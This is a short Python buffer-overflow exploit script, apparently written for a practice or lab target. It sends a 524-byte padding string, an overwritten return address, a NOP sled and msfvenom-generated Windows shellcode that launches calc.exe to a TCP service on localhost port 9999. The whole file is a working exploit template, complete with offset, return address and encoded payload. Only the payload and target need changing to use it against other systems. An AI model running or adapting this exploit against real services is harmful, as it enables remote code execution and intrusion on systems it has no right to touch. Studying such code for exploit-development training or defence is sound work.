import socket
import time
import sys


# msfvenom -p windows/exec CMD=calc.exe EXITFUNC=thread -f c -b '\x00'  
shellcode = (
"\xd9\xc8\xbe\x4a\x69\xe1\x93\xd9\x74\x24\xf4\x5d\x2b\xc9\xb1"
"\x31\x31\x75\x18\x83\xed\xfc\x03\x75\x5e\x8b\x14\x6f\xb6\xc9"
"\xd7\x90\x46\xae\x5e\x75\x77\xee\x05\xfd\x27\xde\x4e\x53\xcb"
"\x95\x03\x40\x58\xdb\x8b\x67\xe9\x56\xea\x46\xea\xcb\xce\xc9"
"\x68\x16\x03\x2a\x51\xd9\x56\x2b\x96\x04\x9a\x79\x4f\x42\x09"
"\x6e\xe4\x1e\x92\x05\xb6\x8f\x92\xfa\x0e\xb1\xb3\xac\x05\xe8"
"\x13\x4e\xca\x80\x1d\x48\x0f\xac\xd4\xe3\xfb\x5a\xe7\x25\x32"
"\xa2\x44\x08\xfb\x51\x94\x4c\x3b\x8a\xe3\xa4\x38\x37\xf4\x72"
"\x43\xe3\x71\x61\xe3\x60\x21\x4d\x12\xa4\xb4\x06\x18\x01\xb2"
"\x41\x3c\x94\x17\xfa\x38\x1d\x96\x2d\xc9\x65\xbd\xe9\x92\x3e"
"\xdc\xa8\x7e\x90\xe1\xab\x21\x4d\x44\xa7\xcf\x9a\xf5\xea\x85"
"\x5d\x8b\x90\xeb\x5e\x93\x9a\x5b\x37\xa2\x11\x34\x40\x3b\xf0"
"\x71\xae\xd9\xd1\x8f\x47\x44\xb0\x32\x0a\x77\x6e\x70\x33\xf4"
"\x9b\x08\xc0\xe4\xe9\x0d\x8c\xa2\x02\x7f\x9d\x46\x25\x2c\x9e"
"\x42\x46\xb3\x0c\x0e\xa7\x56\xb5\xb5\xb7")

offset = 524
nops = '\x90' * 32
buffer = 'A'*524 + '\xf3\x12\x17\x31' + nops + shellcode 

try:
    c = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    c.connect(('127.0.0.1', 9999))
    c.recv(1024)
    c.send(buffer)
    c.close()
    print("[+] Exploit sent!")
    time.sleep(1)
except:
    sys.exit()
